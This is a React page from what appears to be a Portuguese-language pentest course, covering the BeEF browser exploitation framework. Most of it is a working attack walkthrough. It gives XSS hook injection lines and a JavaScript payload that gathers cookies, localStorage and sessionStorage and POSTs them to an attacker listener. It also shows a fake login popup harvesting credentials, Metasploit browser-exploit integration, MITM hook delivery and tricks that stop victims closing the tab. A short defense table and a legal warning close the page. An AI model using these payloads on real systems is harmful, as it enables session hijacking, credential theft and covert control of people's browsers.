import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function BeEF() {
  return (
    <PageContainer
      title="BeEF — Browser Exploitation Framework"
      subtitle="Hookar navegadores via XSS e controlá-los: keylog, screenshots, port scan da rede interna, social engineering."
      difficulty="avancado"
      timeToRead="16 min"
      prompt="exploit/beef"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y beef-xss",
            out: `Reading package lists... Done
beef-xss is already the newest version (0.5.4.0-0kali3).
0 upgraded, 0 newly installed, 0 to remove.`,
            outType: "muted",
          },
          {
            comment: "primeira vez: define a senha do painel",
            cmd: "sudo beef-xss",
            out: `[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]  Hook:   <script src="http://<IP>:3000/hook.js"></script>
[*]  Example: <script src="http://192.168.1.107:3000/hook.js"></script>

beef username [beef]: 
beef password []:  ********
beef password (re): ********

[*] Starting BeEF
[19:42:10][!] [GeoIP] Could not find MaxMind GeoIP database: '/opt/geoip/GeoIP.dat'
[19:42:10][!] [GeoIP] Run geoipupdate
[19:42:11][*] BeEF is loading. Wait a few seconds...
[19:42:13][*] 16 extensions enabled.
[19:42:13][*] 366 modules enabled.
[19:42:13][*] 2 network interfaces were detected.
[19:42:13][+] running on network interface: 127.0.0.1
[19:42:13][+] running on network interface: 192.168.1.107
[19:42:13][*] Hook URL: http://192.168.1.107:3000/hook.js
[19:42:13][*] UI URL:   http://192.168.1.107:3000/ui/panel
[19:42:13][*] BeEF server started (press control+c to stop)`,
            outType: "success",
          },
          {
            cmd: "firefox http://127.0.0.1:3000/ui/panel &",
            out: "(login com beef/senha que você definiu)",
            outType: "default",
          },
        ]}
      />

      <h2>Anatomia do hook</h2>
      <CodeBlock
        language="html"
        title="injectar em página vulnerável a XSS armazenado"
        code={`<!-- 1 linha. quando vítima carrega, vira "zumbi" no painel -->
<script src="http://192.168.1.107:3000/hook.js"></script>

<!-- ou via XSS refletido na URL: -->
<!-- https://app.vuln/search?q=<script src=//192.168.1.107:3000/hook.js></script> -->`}
      />

      <h2>Quando uma vítima cai</h2>
      <OutputBlock label="Painel BeEF — Online Browsers" type="info">
{`Online Browsers
  192.168.1.50
    └─ Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.6367.155
        ID:1  HostName: DESKTOP-ANA   Page: https://blog.empresa.com/post/42
        ↳ click para abrir → 4 abas: Details, Logs, Commands, Rider, XssRays`}
      </OutputBlock>

      <h2>Aba Details — fingerprint da vítima</h2>
      <OutputBlock label="o que o BeEF descobre automaticamente" type="default">
{`Browser Name:        Chrome
Browser Version:     124.0.6367.155
Browser Language:    pt-BR
Browser Platform:    Win32
Plugin: PDF Viewer (internal-pdf-viewer)
Plugin: Chrome PDF Viewer
Plugin: Chromium PDF Viewer

Screen Size:         1920x1080
Window Size:         1840x968
Touch Enabled:       false
Webcam Available:    Yes (1 device)
Microphone Avail:    Yes (1 device)

Local IP:            192.168.1.50
Public IP:           201.83.42.108  (via WebRTC leak)
Geolocation:         São Paulo, BR

Cookies (this site):
  PHPSESSID=fa72b3c8d49e22a6f1e84
  user=jose
  csrftoken=ABC123XYZ

Page URL:            https://blog.empresa.com/post/42
Referer:             https://www.google.com/
Date/Time:           Wed Apr  3 19:43:11 2026 GMT-0300`}
      </OutputBlock>

      <h2>Módulos prontos (Commands tab)</h2>
      <CommandTable
        title="Categorias de comandos"
        variations={[
          { cmd: "Browser → Hooked Domain → Get Cookie", desc: "Rouba cookies da página onde foi hookado.", output: "PHPSESSID, JWT, etc." },
          { cmd: "Browser → Webcam HTML5", desc: "Pede permissão de webcam (Chrome mostra popup).", output: "Se aceito, transmite vídeo." },
          { cmd: "Browser → Get Page HTML", desc: "Baixa o HTML completo da página atual.", output: "Salva no painel BeEF." },
          { cmd: "Browser → Detect Visited URLs", desc: "Histórico (lista pré-definida).", output: "facebook, gmail, banco — quais a vítima visitou." },
          { cmd: "Network → Internal IP via WebRTC", desc: "IP local (vaza por WebRTC).", output: "192.168.x.x" },
          { cmd: "Network → Port Scanner", desc: "Scaneia portas via JS (lentíssimo mas funciona).", output: "Abre conexões a portas internas." },
          { cmd: "Network → Ping Sweep", desc: "Detecta hosts vivos na LAN da vítima.", output: "img tags com timeout." },
          { cmd: "Social Engineering → Pretty Theft", desc: "Popup falso (Facebook/Google/Custom) pedindo login.", output: "Credenciais voltam ao painel." },
          { cmd: "Social Engineering → Fake Notification", desc: "Notificação web falsa.", output: "Pede clique numa URL." },
          { cmd: "Social Engineering → Clippy", desc: "Personagem do Office pedindo update.", output: "Drop de exe." },
          { cmd: "Persistence → Confirm Close Tab", desc: "Vítima não consegue fechar a aba.", output: "onbeforeunload abuse." },
          { cmd: "Persistence → Man-In-The-Browser", desc: "Captura todos os clicks subsequentes.", output: "Mantém hook após navegação." },
          { cmd: "Exploits → Invisible iframe browser exploitation", desc: "Carrega exploit kit em iframe oculto.", output: "Tenta browser exploits conhecidos." },
          { cmd: "Host → Get Geo Location", desc: "Pede permissão de geolocation.", output: "lat/lng com 5m de precisão." },
          { cmd: "Misc → Raw JavaScript", desc: "Executa qualquer JS no contexto da vítima.", output: "Para módulo customizado." },
        ]}
      />

      <h2>Pretty Theft — phishing dentro do site real</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "no painel BeEF, escolher 1 vítima → Commands → Social Engineering → Pretty Theft → executar",
            cmd: "(via UI)",
            out: `Module: Pretty Theft
  Dialog Type: Facebook
  Backing: gray
  Custom Logo URL: (deixa em branco — usa logo do FB)

  → click 'Execute'

[19:51:42][>] Hooked browser [192.168.1.50]: requested → display popup
[19:51:55][<] Hooked browser [192.168.1.50]: pretty_theft credentials:
                username = ana.silva@empresa.com
                password = Empresa@2025!`,
            outType: "error",
          },
        ]}
      />

      <h2>Raw JavaScript — payload customizado</h2>
      <CodeBlock
        language="javascript"
        title="Commands → Misc → Raw JavaScript → Code"
        code={`// rouba localStorage e sessionStorage da vítima
var loot = {};
loot.localStorage = {};
loot.sessionStorage = {};
loot.cookies = document.cookie;

for (var i = 0; i < localStorage.length; i++) {
  var k = localStorage.key(i);
  loot.localStorage[k] = localStorage.getItem(k);
}
for (var i = 0; i < sessionStorage.length; i++) {
  var k = sessionStorage.key(i);
  loot.sessionStorage[k] = sessionStorage.getItem(k);
}

// envia de volta para o atacante (mesmo origin do hook = sem CORS)
fetch("http://192.168.1.107:8000/loot", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(loot)
});

return "loot enviado: " + JSON.stringify(loot).slice(0, 80) + "...";`}
      />

      <Terminal
        path="~/loot"
        lines={[
          {
            comment: "no atacante: receber em python -m http.server",
            cmd: "python3 -m http.server 8000",
            out: `Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.50 - - [03/Apr/2026 19:54:21] "POST /loot HTTP/1.1" 501 -`,
            outType: "info",
          },
          {
            comment: "ou um receiver real (ncat)",
            cmd: "ncat -lkvp 8000",
            out: `Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 192.168.1.50.
POST /loot HTTP/1.1
Host: 192.168.1.107:8000
Content-Type: application/json
Content-Length: 412

{"localStorage":{"jwt_token":"eyJhbGciOiJIUzI1NiIs..."},"sessionStorage":{},"cookies":"PHPSESSID=fa72b..."}`,
            outType: "warning",
          },
        ]}
      />

      <h2>Integração com Metasploit (browser exploits)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "habilitar a integração no /etc/beef-xss/config.yaml",
            cmd: "sudo sed -i 's/^    enable: false$/    enable: true/' /etc/beef-xss/extensions/metasploit/config.yaml",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo grep -A2 'metasploit' /etc/beef-xss/config.yaml | head",
            out: `extension:
    metasploit:
        enable: true
        host: "127.0.0.1"
        user: "msf"`,
            outType: "info",
          },
          {
            comment: "subir msfrpcd",
            cmd: "sudo msfrpcd -P abc123 -S -a 127.0.0.1",
            out: `[*] MSGRPC Service:  127.0.0.1:55552 
[*] MSGRPC Username: msf
[*] MSGRPC Password: abc123`,
            outType: "default",
          },
          {
            comment: "no painel BeEF agora aparecem CENTENAS de browser exploits do msf",
            cmd: "(UI: Commands → metasploit → IE/Chrome/Firefox CVEs)",
            out: "Auto-aplicáveis ao zumbi.",
            outType: "muted",
          },
        ]}
      />

      <h2>Modos de delivery do hook</h2>
      <OutputBlock label="formas comuns de pegar zumbis" type="muted">
{`1. XSS armazenado em fórum/blog/comentários
   <script src="http://atacante:3000/hook.js"></script>

2. XSS refletido (link enviado por phishing)
   https://app.vuln/search?q=<script src=//atacante:3000/hook.js></script>

3. Página de phishing standalone (atacante hospeda)
   <html><body>... <script src="..."></script>

4. MITM (ver Ettercap) — injeta hook em respostas HTTP
   Bettercap: set http.proxy.script inject_hook.js

5. Smart TV / iot com browser embarcado
   geralmente sem CSP, sem auto-update`}
      </OutputBlock>

      <h2>Defesa</h2>
      <CommandTable
        title="O que mata o BeEF"
        variations={[
          { cmd: "CSP estrito", desc: "Content-Security-Policy: script-src 'self'.", output: "Hook de outro origin = bloqueado." },
          { cmd: "X-Frame-Options DENY", desc: "Impede hookar via iframe.", output: "Bom complemento ao CSP." },
          { cmd: "HttpOnly cookies", desc: "Cookies não acessíveis via JS.", output: "BeEF não rouba PHPSESSID/JWT." },
          { cmd: "WebRTC leak protection", desc: "Brave / uBlock Origin / about:config.", output: "Não vaza IP local." },
          { cmd: "WAF (Cloudflare/Akamai)", desc: "Detecta /hook.js padrão.", output: "Renomear hook (config.yaml)." },
          { cmd: "Browser MFA + MFA prompt", desc: "Mesmo se roubam cookie, MFA exige device.", output: "Quebra session hijacking." },
        ]}
      />

      <PracticeBox
        title="Hookar você mesmo (lab)"
        goal="Subir BeEF, hookar seu próprio Firefox numa página HTML local, executar 3 módulos."
        steps={[
          "Suba sudo beef-xss e abra o painel.",
          "Crie /tmp/lab.html com o hook script apontando pro seu IP.",
          "Abra /tmp/lab.html no Firefox.",
          "No painel → vítima aparece em Online Browsers.",
          "Execute: Get Cookie, Webcam HTML5, Pretty Theft.",
        ]}
        command={`echo '<html><body><h1>Lab</h1>
<script src="http://192.168.1.107:3000/hook.js"></script>
</body></html>' > /tmp/lab.html

firefox /tmp/lab.html &
# (vai pro painel http://127.0.0.1:3000/ui/panel)`}
        expected={`Online Browsers
  127.0.0.1
    └─ Firefox/126.0
        Page: file:///tmp/lab.html
        Status: ●online`}
        verify="Aba Details mostra fingerprint completo, Logs mostra todo evento JS, Commands mostra ~250 módulos prontos."
      />

      <AlertBox type="warning" title="Hook morre quando vítima fecha a aba">
        BeEF é session-bound: assim que a vítima fecha a aba (ou navega para outro origin),
        você perde o zumbi. Por isso é comum combinar com módulos de <strong>Persistence</strong>:
        <code>Confirm Close Tab</code>, <code>MITB</code> ou abrir o hook em iframe oculto.
      </AlertBox>

      <AlertBox type="danger" title="Sem alvo autorizado é crime">
        Hookar browser de terceiro = acesso não autorizado + interceptação. Use apenas em
        ambiente de teste, em pentest com permissão escrita, ou no SEU próprio browser.
      </AlertBox>
    </PageContainer>
  );
}
